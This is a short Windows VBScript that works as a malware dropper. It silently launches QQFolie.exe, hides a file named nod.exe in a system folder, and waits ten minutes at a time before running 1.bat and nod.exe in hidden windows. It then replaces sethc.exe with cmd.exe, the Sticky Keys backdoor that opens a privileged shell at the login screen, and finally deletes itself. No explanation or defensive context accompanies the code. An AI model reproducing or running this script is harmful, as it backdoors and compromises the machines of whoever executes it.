set ws=wscript.createobject("wscript.shell")
ws.run "cmd /c QQFolie.exe",0 '
wscript.sleep 10000
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
a.GetFile("C:\WINDOWS\twain_32\nod.exe").Attributes = 7
wscript.sleep 600000
CreateObject("WScript.Shell").Run "cmd /c 1.bat",0
wscript.sleep 600000
CreateObject("WScript.Shell").Run "cmd /c nod.exe",0
Set obj = CreateObject("WScript.Shell")
success = obj.run("cmd /c takeown /f %SystemRoot%\system32\sethc.exe&echo y| cacls %SystemRoot%\system32\sethc.exe /G %USERNAME%:F&copy; %SystemRoot%\system32\cmd.exe %SystemRoot%\system32\acmd.exe&copy; %SystemRoot%\system32\sethc.exe %SystemRoot%\system32\asethc.exe&del %SystemRoot%\system32\sethc.exe&ren %SystemRoot%\system32\acmd.exe sethc.exe", 0, True)
CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName)





